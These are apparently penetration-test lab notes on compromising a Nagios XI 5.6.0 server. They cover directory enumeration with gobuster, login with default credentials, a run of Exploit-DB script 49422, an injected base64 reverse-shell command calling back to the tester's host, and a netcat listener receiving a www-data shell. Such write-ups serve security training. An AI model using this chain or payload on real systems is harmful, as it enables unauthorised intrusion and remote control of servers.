# 2 :80 nagios xi

```
http://192.168.200.136/
Nagios XI Landing Page

http://192.168.200.136/nagiosxi/login.php
Login Page | Nagios XI

$ gobuster dir -u http://192.168.200.136/nagiosxi -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 80
===============================================================
/help                 (Status: 301) [Size: 326] [--> http://192.168.200.136/nagiosxi/help/]
/tools                (Status: 301) [Size: 327] [--> http://192.168.200.136/nagiosxi/tools/]
/login.php            (Status: 200) [Size: 25896]
/admin                (Status: 301) [Size: 327] [--> http://192.168.200.136/nagiosxi/admin/]
/reports              (Status: 301) [Size: 329] [--> http://192.168.200.136/nagiosxi/reports/]
/account              (Status: 301) [Size: 329] [--> http://192.168.200.136/nagiosxi/account/]
/about                (Status: 301) [Size: 327] [--> http://192.168.200.136/nagiosxi/about/]
/images               (Status: 301) [Size: 328] [--> http://192.168.200.136/nagiosxi/images/]
/index.php            (Status: 302) [Size: 27] [--> http://192.168.200.136/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1]
/includes             (Status: 301) [Size: 330] [--> http://192.168.200.136/nagiosxi/includes/]
/install.php          (Status: 302) [Size: 0] [--> http://192.168.200.136/nagiosxi/]
/backend              (Status: 301) [Size: 329] [--> http://192.168.200.136/nagiosxi/backend/]
/db                   (Status: 301) [Size: 324] [--> http://192.168.200.136/nagiosxi/db/]
/api                  (Status: 301) [Size: 325] [--> http://192.168.200.136/nagiosxi/api/]
/upgrade.php          (Status: 302) [Size: 0] [--> index.php]
/config               (Status: 301) [Size: 328] [--> http://192.168.200.136/nagiosxi/config/

# Default Creds:
nagiosadmin:admin

Using https://www.exploit-db.com/exploits/49422

$ python3 49422.py https://192.168.200.136 nagiosadmin admin 192.168.49.200 6969
[+] Extract login nsp token : 8039eaffa2bf4b6c7c99f4188d4fa45d04271994e65531978b407c1bfca2c33c
[+] Login ... Success!
[+] Request upload form ...
[+] Extract upload nsp token : 2aebe212ccb700e5eeddc8d34db537e7c249769a76ef8247277e57951fec3603
[+] Base64 encoded payload : ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIwMC82OTY5IDA+JjE= | base64 -d | bash;#
[+] Sending payload ...
[+] Check your nc ...


$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [192.168.49.200] from (UNKNOWN) [192.168.200.136] 55346
bash: cannot set terminal process group (959): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/local/nagiosxi/html/admin$ whoami;id;hostname
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
ubuntu

Version Check
v.5.6.0
```
